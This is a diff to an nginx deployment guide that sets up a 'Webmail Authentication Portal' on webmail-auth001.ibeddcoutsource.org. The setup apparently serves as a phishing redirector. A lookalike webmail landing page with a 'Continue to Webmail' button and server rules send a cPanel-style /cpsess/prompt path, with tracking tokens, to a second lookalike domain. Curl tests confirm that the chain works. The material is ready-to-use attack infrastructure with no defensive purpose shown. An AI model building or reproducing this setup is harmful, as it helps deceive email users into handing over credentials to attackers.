@@ -35,6 +35,8 @@ sudo nano /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org
 
 STEP 4: ADD THE FOLLOWING CONFIGURATION
 ======================================
+
+# OPTION 1: REDIRECT ONLY CONFIGURATION (Current Setup)
 server {
     listen 80;
     server_name webmail-auth001.ibeddcoutsource.org;
@@ -75,19 +77,148 @@ server {
     }
 }
 
-STEP 5: ENABLE THE SITE
+# OPTION 2: WEBSITE SERVING CONFIGURATION (If you want to serve your own website)
+server {
+    listen 80;
+    server_name webmail-auth001.ibeddcoutsource.org;
+    
+    # Redirect all HTTP traffic to HTTPS
+    return 301 https://$server_name$request_uri;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name webmail-auth001.ibeddcoutsource.org;
+    
+    # SSL Configuration
+    ssl_certificate /etc/ssl/certs/webmail-auth001.ibeddcoutsource.org.crt;
+    ssl_certificate_key /etc/ssl/private/webmail-auth001.ibeddcoutsource.org.key;
+    
+    # SSL Security Settings
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
+    ssl_prefer_server_ciphers off;
+    ssl_session_cache shared:SSL:10m;
+    ssl_session_timeout 10m;
+    
+    # Website root directory
+    root /var/www/webmail-auth001.ibeddcoutsource.org;
+    index index.html index.htm index.php;
+    
+    # Serve static files
+    location / {
+        try_files $uri $uri/ /index.html;
+    }
+    
+    # Handle the encryption path redirect
+    location = /cpsess/prompt {
+        return 301 https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3$is_args$args;
+    }
+    
+    # Handle dynamic token generation
+    location ~ ^/cpsess/prompt\?(.*)$ {
+        set $original_args $1;
+        return 301 https://webmail-auth001.molecullesoft.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3&$original_args;
+    }
+    
+    # Security headers
+    add_header X-Frame-Options "SAMEORIGIN" always;
+    add_header X-XSS-Protection "1; mode=block" always;
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header Referrer-Policy "no-referrer-when-downgrade" always;
+    add_header Content-Security-Policy "default-src 'self' http: https: data: blob: 'unsafe-inline'" always;
+}
+
+STEP 5: CREATE WEBSITE DIRECTORY AND ADD INDEX.HTML
+==================================================
+# Create the website directory
+sudo mkdir -p /var/www/webmail-auth001.ibeddcoutsource.org
+
+# Set proper permissions
+sudo chown -R www-data:www-data /var/www/webmail-auth001.ibeddcoutsource.org
+sudo chmod -R 755 /var/www/webmail-auth001.ibeddcoutsource.org
+
+# Create a sample index.html file
+sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/index.html
+
+# Add this content to index.html:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Authentication - Redirect Portal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 500px;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            line-height: 1.6;
+        }
+        .redirect-btn {
+            background: #667eea;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+            transition: background 0.3s;
+        }
+        .redirect-btn:hover {
+            background: #5a6fd8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Webmail Authentication Portal</h1>
+        <p>This is a secure authentication portal. You will be redirected to the main webmail service.</p>
+        <a href="/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3" class="redirect-btn">
+            Continue to Webmail
+        </a>
+    </div>
+</body>
+</html>
+
+# Create additional pages (optional)
+sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/about.html
+sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/contact.html
+
+STEP 6: ENABLE THE SITE
 =======================
 sudo ln -s /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org /etc/nginx/sites-enabled/
 
-STEP 6: TEST NGINX CONFIGURATION
+STEP 7: TEST NGINX CONFIGURATION
 ================================
 sudo nginx -t
 
-STEP 7: RELOAD NGINX
+STEP 8: RELOAD NGINX
 ====================
 sudo systemctl reload nginx
 
-STEP 8: OBTAIN SSL CERTIFICATES (USING CERTBOT)
+STEP 9: OBTAIN SSL CERTIFICATES (USING CERTBOT)
 ===============================================
 # Install Certbot
 sudo apt install certbot python3-certbot-nginx -y
@@ -95,8 +226,8 @@ sudo apt install certbot python3-certbot-nginx -y
 # Obtain SSL certificate
 sudo certbot --nginx -d webmail-auth001.ibeddcoutsource.org
 
-STEP 9: VERIFY DNS SETTINGS
-===========================
+STEP 10: VERIFY DNS SETTINGS
+============================
 # Add these DNS records to your domain registrar:
 # Type: A
 # Name: webmail-auth001.ibeddcoutsource.org
@@ -106,19 +237,25 @@ STEP 9: VERIFY DNS SETTINGS
 nslookup webmail-auth001.ibeddcoutsource.org
 dig webmail-auth001.ibeddcoutsource.org
 
-STEP 10: TEST THE REDIRECT
-==========================
-# Test using curl
+STEP 11: TEST THE WEBSITE AND REDIRECT
+======================================
+# Test the main website
 curl -I http://webmail-auth001.ibeddcoutsource.org
 curl -I https://webmail-auth001.ibeddcoutsource.org
 
-# Test the specific encryption path
+# Test the index.html page
+curl https://webmail-auth001.ibeddcoutsource.org
+
+# Test the specific encryption path redirect
 curl -I "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3"
 
 # Test with additional parameters
 curl -I "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3&additional=param"
 
-STEP 11: MONITOR NGINX LOGS
+# Test the redirect button on the website
+curl -L "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3"
+
+STEP 12: MONITOR NGINX LOGS
 ===========================
 # View access logs
 sudo tail -f /var/log/nginx/access.log
@@ -126,7 +263,10 @@ sudo tail -f /var/log/nginx/access.log
 # View error logs
 sudo tail -f /var/log/nginx/error.log
 
-STEP 12: FIREWALL CONFIGURATION
+# View website-specific logs
+sudo tail -f /var/log/nginx/webmail-auth001.ibeddcoutsource.org.access.log
+
+STEP 13: FIREWALL CONFIGURATION
 ===============================
 # Allow HTTP and HTTPS traffic
 sudo ufw allow 80/tcp
@@ -135,7 +275,7 @@ sudo ufw allow 443/tcp
 # Enable firewall
 sudo ufw enable
 
-STEP 13: SECURITY CONSIDERATIONS
+STEP 14: SECURITY CONSIDERATIONS
 ================================
 # Set up fail2ban for additional security
 sudo apt install fail2ban -y
@@ -152,7 +292,7 @@ filter = nginx-http-auth
 logpath = /var/log/nginx/error.log
 maxretry = 3
 
-STEP 14: BACKUP CONFIGURATION
+STEP 15: BACKUP CONFIGURATION
 =============================
 # Backup your nginx configuration
 sudo cp /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org.backup
@@ -161,7 +301,10 @@ sudo cp /etc/nginx/sites-available/webmail-auth001.ibeddcoutsource.org /etc/ngin
 sudo cp /etc/ssl/certs/webmail-auth001.ibeddcoutsource.org.crt /etc/ssl/certs/webmail-auth001.ibeddcoutsource.org.crt.backup
 sudo cp /etc/ssl/private/webmail-auth001.ibeddcoutsource.org.key /etc/ssl/private/webmail-auth001.ibeddcoutsource.org.key.backup
 
-STEP 15: VERIFICATION COMMANDS
+# Backup website files
+sudo cp -r /var/www/webmail-auth001.ibeddcoutsource.org /var/www/webmail-auth001.ibeddcoutsource.org.backup
+
+STEP 16: VERIFICATION COMMANDS
 ==============================
 # Check nginx status
 sudo systemctl status nginx
@@ -172,7 +315,7 @@ sudo nginx -t
 # Check SSL certificate
 sudo certbot certificates
 
-# Test redirect functionality
+# Test website functionality
 curl -L -I https://webmail-auth001.ibeddcoutsource.org
 
 # Test encryption path redirect
@@ -180,6 +323,10 @@ curl -L -I "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&
 
 # Verify the final URL
 curl -L -v "https://webmail-auth001.ibeddcoutsource.org/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=3" 2>&1 | grep "Location:"
+
+# Check website files
+ls -la /var/www/webmail-auth001.ibeddcoutsource.org/
+cat /var/www/webmail-auth001.ibeddcoutsource.org/index.html
 
 TROUBLESHOOTING COMMANDS
 ========================
@@ -206,6 +353,33 @@ NOTES:
 - SSL certificates will auto-renew with certbot
 - Monitor logs regularly for any issues
 - Keep your system updated: sudo apt update && sudo apt upgrade
+
+WEBSITE FILE LOCATION:
+======================
+- Your index.html and other website files go in: /var/www/webmail-auth001.ibeddcoutsource.org/
+- Default index files: index.html, index.htm, index.php
+- Static assets (CSS, JS, images) can be placed in subdirectories
+- File permissions should be 755 for directories and 644 for files
+- Owner should be www-data:www-data
+
+CUSTOMIZING YOUR WEBSITE:
+=========================
+# To add your own content, edit the index.html file:
+sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/index.html
+
+# To add CSS files:
+sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/css/style.css
+
+# To add JavaScript files:
+sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/js/script.js
+
+# To add images:
+# Place images in: /var/www/webmail-auth001.ibeddcoutsource.org/images/
+
+# To create additional pages:
+sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/about.html
+sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/contact.html
+sudo nano /var/www/webmail-auth001.ibeddcoutsource.org/services.html
 
 ENCRYPTION PATH DETAILS:
 ========================
